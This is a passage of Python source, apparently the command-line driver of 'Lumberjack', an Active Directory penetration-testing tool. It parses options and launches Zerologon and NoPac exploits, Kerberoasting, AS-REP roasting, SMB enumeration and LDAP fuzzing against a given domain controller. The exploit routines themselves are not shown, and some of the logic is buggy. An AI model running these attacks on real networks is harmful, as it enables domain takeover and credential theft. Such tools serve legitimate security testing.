	parser.add_argument('-en', '--enumerate', help='Enumerate Active Directory Objects', action='store_true')
	parser.add_argument('-n', '--netbios', type=str, help='NetBIOS name of Domain Controller')
	parser.add_argument('-large', help='For Active Directories with over 1000 users', action='store_true')
	parser.add_argument('-e', '--exploit', type=str, help='run exploit features: 1 = zerologon, 2 = NoPac')
	parser.add_argument('-krb', '--kerberoast', help='Run Kerberoasting', action='store_true')
	parser.add_argument('-asrep', help='AS-REP Roasting', action='store_true')
	parser.add_argument('-smb', '--smb', help='enumerate SMB shares', action='store_true')
	parser.add_argument('-f', '--fuzz', type=str)
	args = parser.parse_args()
	
	#split credentials into their three components: name of DC, username, and the password
	domain, username, password = parse_credentials(args.credentials)
	dc_ip = args.ip_address
	
	#Display help page if no arguments are provided
	if len(sys.argv) < 2:
		console.print("[-] Warning: No Arguments Provided", style = "warning")
		parser.print_help()
		parser.exit(1)
	
	if domain is None:
		domain = ''

	if password == '' and username != '':
		password = getpass("Password:")

	if args.fuzz:
		args.enumerate = False
		args.exploit = False
	elif args.enumerate:
		args.exploit = False
	
	if not args.exploit != 1:		
		#Regex for invalid domain name or invalid ip address format or no password
		domainRE = re.compile(r'^(([a-zA-Z]{1})|([a-zA-Z]{1}[a-zA-Z]{1})|([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|([a-zA-Z0-9][-_\.a-zA-Z0-9]{1,61}[a-zA-Z0-9]))\.([a-zA-Z]{2,13}|[a-zA-Z0-9-]{2,30}\.[a-zA-Z]{2,3})$')
		domainMatch = domainRE.findall(domain)

		ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
		ipaddr = ipRE.findall(dc_ip)
		
		#if invalid domain name and ip address format
		if not ipaddr:
			console.print("[-] Error: {} is not a valid IP Address'".format(dc_ip), style = "error")
			sys.exit(1)
		if not domainMatch:
			console.print("[-] Error: {} is not a valid domain name'".format(domain), style = "error")
			sys.exit(1)
			
	titleArt()
	print('')
	console.print("[+] Success: Lumberjack Started", style="success")
	print('')
	console.print("[-] Input Values", style="info")
	print(f"Domain : {domain} \nUsername : {username} \nPassword: {password} \nIP Address : {dc_ip}")
	print('')
	
	#The clock is running!	
	start_time = datetime.now()
	
	if args.exploit == '1':
		dc_name = args.netbios.rstrip("$")
		ExploitAD.perform_attack("\\\\" + dc_name, dc_ip, dc_name)
	if args.exploit != '1':
		connectAD = Connect(args.credentials, dc_ip, status)
		connectAD.__init__(args.credentials, dc_ip, status)
		console.print("[+] Success: Connected to Active Directory through LDAPs", style = "success")
		print('')

	#server and connection to AD
	s = connectAD.server
	c = connectAD.conn
	
	if args.exploit == '2':
		args.enumerate = False
		args.fuzz = False
		ExploitAD.TGT_size(args.credentials, dc_ip, status)
	
	#password strength regex
	pswdreg = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,18}$"
	match_re = re.compile(pswdreg)
	pwdres = re.search(match_re, password)

	#Run main features
	try:
		enumAD = EnumerateAD(s, c, args.kerberoast, args.smb, args.fuzz, domain, username, password, dc_ip, status, args.large, args.asrep)
		if not pwdres:
			print('')
			console.print("[!] Vulnerability: Active Directory has a weak password policy", style = "error")
			print('')
		if args.enumerate is not False:
			status.update("[bold white]Waiting...")
			console.print ("[-] Enumerate Users?", style = "status")
			input("")
			enumAD.enumerateUsers()
		elif args.fuzz is not False:
			enumAD.searchRandom(args.fuzz)
	
	except KeyboardInterrupt:
		console.print ("[-] Warning: Aborting", style = "warning")
			
	#Exit Lumberjack
	status.update("[bold white]Exiting Lumberjack...")
	sleep(1)
	#Stop the clock
	elapsed = datetime.now() - start_time
	console.print(f"[-] Completed after {elapsed.total_seconds():.2f} seconds", style="warning")
	
	#print blank line
	print('')
	
if __name__ == "__main__":
	with console.status("[bold white]Starting Lumberjack...") as status:
		print('')
		try:
			sleep(1)
			main()
			console.print("[+] Success: Finished", style="success")	
		except KeyboardInterrupt:
			console.print ("[-] Warning: Aborted", style= "warning")
